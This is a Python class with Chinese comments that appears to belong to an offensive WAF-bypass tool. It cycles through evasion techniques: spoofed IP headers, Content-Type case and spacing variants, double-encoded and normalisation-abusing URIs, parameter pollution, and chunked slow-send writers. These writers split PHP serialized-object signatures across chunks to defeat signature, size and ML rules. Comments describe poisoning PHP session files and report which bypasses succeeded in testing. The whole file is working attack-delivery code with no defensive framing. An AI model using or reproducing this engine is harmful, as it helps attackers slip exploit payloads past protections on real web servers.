class BypassEngine:
    """按 WAF 指纹选模板，逐轮吐出请求变体（URI/头部/传输/参数四层）。"""

    def __init__(self, level: int = 3, cookie: Optional[str] = None,
                 profile: Optional[List[str]] = None):
        self.level = max(0, min(3, level))
        self.cookie = cookie
        self.profile = profile or DEFAULT_PROFILE
        self.idx = 0
        self.body_budget = 8192            # 载荷体预算（体积规则命中时自动压缩）
        self.seed_mode = "full"            # full=完整发送（需 cleanup=Off，公开 PoC 可靠持久化路径）
                                           # abort=在途窗口实验模式（实测 8.2.34 会话仅在解析完成时写盘）
        self.warmed_cookies: List[str] = []

    # ---- 策略轮换 ----
    def next_strategy(self) -> str:
        if self.level == 0:
            return "plain"
        s = self.profile[self.idx % len(self.profile)]
        self.idx += 1
        return s

    # ---- 头部层 ----
    def headers(self, strategy: str, boundary: str, sid: str) -> Dict[str, str]:
        h = {"User-Agent": UA_POOL[self.idx % len(UA_POOL)],
             "Accept": "*/*", "Connection": "close"}
        if strategy in ("junk_headers", "warmup_cookie") or self.level >= 2:
            h.update({
                "X-Forwarded-For": "%d.%d.%d.%d" % tuple(random.randint(1, 254) for _ in range(4)),
                "X-Real-IP": "%d.%d.%d.%d" % tuple(random.randint(1, 254) for _ in range(4)),
                "Referer": "https://www.google.com/",
                "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8",
                "X-Requested-With": "XMLHttpRequest",
            })
        if strategy == "ua_crawler":
            h["User-Agent"] = UA_POOL[-1]
        if strategy == "junk_headers" and self.level >= 3:
            h["X-Custom-%s" % "".join(random.choice(string.ascii_uppercase) for _ in range(5))] = "1"
        cookies = []
        if self.warmed_cookies:
            cookies += self.warmed_cookies
        if self.cookie:
            cookies.append(self.cookie)
        if strategy != "cookie_body_only":
            cookies.append("PHPSESSID=" + sid)
        if cookies:
            h["Cookie"] = "; ".join(cookies)
        if boundary:
            if strategy == "ct_case":        # WAF 正则常大小写敏感，PHP 解析不敏感
                h["Content-Type"] = "Multipart/Form-Data; Boundary=" + boundary
            elif strategy == "ct_space":     # 多余空白/参数干扰规则匹配
                h["Content-Type"] = 'multipart/form-data ; charset=UTF-8; boundary="%s"' % boundary
            else:
                h["Content-Type"] = "multipart/form-data; boundary=" + boundary
            if strategy == "expect_100":     # Expect:100-continue 走不同解析分支
                h["Expect"] = "100-continue"
        return h

    # ---- URI 层 ----
    def uri(self, path: str, strategy: str) -> str:
        if strategy == "uri_double_enc":
            # 真·双重编码：普通字符 -> %25XX（一次解码得 %XX，二次解码才还原，打击二次解码型 WAF/代理）
            return re.sub(r"[^/]", lambda m: "%%25%02X" % ord(m.group(0)), path)
        if strategy == "uri_enc":
            # 单次全量百分号编码：WAF 见变形串、服务端一次解码还原
            return re.sub(r"[^/]", lambda m: "%%%02X" % ord(m.group(0)), path)
        if strategy == "uri_dot_seg":
            # %2e 段混淆：句点编码后与归一化前后规则不一致
            return path.replace(".", "%2e")
        if strategy == "uri_dot_norm":
            # /./ 归一化差异
            return "/." + path if path.startswith("/") else "/./" + path
        if strategy == "uri_semi":
            # 分号矩阵参数（PATH_INFO 解析差异）
            return path + ";x"
        if strategy == "uri_slash":
            # 重复斜杠
            return re.sub(r"/+", "//", path)
        if strategy == "uri_tail":
            # 尾斜杠
            return path if path.endswith("/") else path + "/"
        if strategy == "uri_case":
            return "".join(c.upper() if i % 2 else c for i, c in enumerate(path))
        if strategy == "path_info":
            # PATH_INFO 后缀
            return path + "/x" if path.endswith(".php") else path.rstrip("/") + "/index.php/x"
        return path

    # ---- 参数层（HPP / 字段顺序 / boundary 引号）----
    @staticmethod
    def mangle_fields(fields: List[Tuple[str, str]], strategy: str) -> List[Tuple[str, str]]:
        if strategy == "hpp":
            return fields + fields            # HPP：双写参数
        if strategy == "junk_field":          # 伪装普通表单
            return [("submit", "1"), ("MAX_FILE_SIZE", "10485760")] + fields
        if strategy == "disorder":            # 字段顺序调换
            return list(reversed(fields))
        return fields

    @staticmethod
    def ctype(boundary: str, strategy: str) -> Dict[str, str]:
        if strategy == "bnd_quote":
            return {"Content-Type": 'multipart/form-data; boundary="%s"' % boundary}
        return {"Content-Type": "multipart/form-data; boundary=" + boundary}

    # ---- 传输层：FRAGMENT 分片慢发（terminate=False 时不发终止块=在途窗口投毒）----
    @staticmethod
    def fragment_writer(body: bytes, delay: float = 0.2, frag: int = 512,
                        terminate: bool = True):
        def w(sock: socket.socket):
            for i in range(0, len(body), frag):
                chunk = body[i:i + frag]
                sock.sendall(b"%x\r\n" % len(chunk) + chunk + b"\r\n")
                time.sleep(delay)
            if terminate:
                sock.sendall(b"0\r\n\r\n")
        return w

    # ---- 语义+体积双绕过：随机多分片跨特征切分+抖动 ----
    # 实证：~2KB 体积规则下 8KB 总量经 2-8 分片放行(404/200)；
    #      序列化特征串跨分片边界可过语义规则(404)；分片尺寸随机化对抗形态评分(ML)。
    @staticmethod
    def sig_frag_writer(body: bytes, delay: float = 0.25, terminate: bool = True):
        m = re.search(rb"[OC]:\d+:\"", body)
        pos = (m.start() + 4) if m else len(body) // 3
        cuts = [0, pos]
        i = pos
        while i < len(body):
            i += random.randint(256, 1024)      # 随机分片尺寸（形态对抗）
            cuts.append(min(i, len(body)))
        if cuts[-1] != len(body):
            cuts.append(len(body))

        def w(sock: socket.socket):
            for a, b in zip(cuts, cuts[1:]):
                sock.sendall(b"%x\r\n" % (b - a) + body[a:b] + b"\r\n")
                time.sleep(delay * random.uniform(0.5, 1.5))   # 抖动（行为对抗）
            if terminate:
                sock.sendall(b"0\r\n\r\n")
        return w


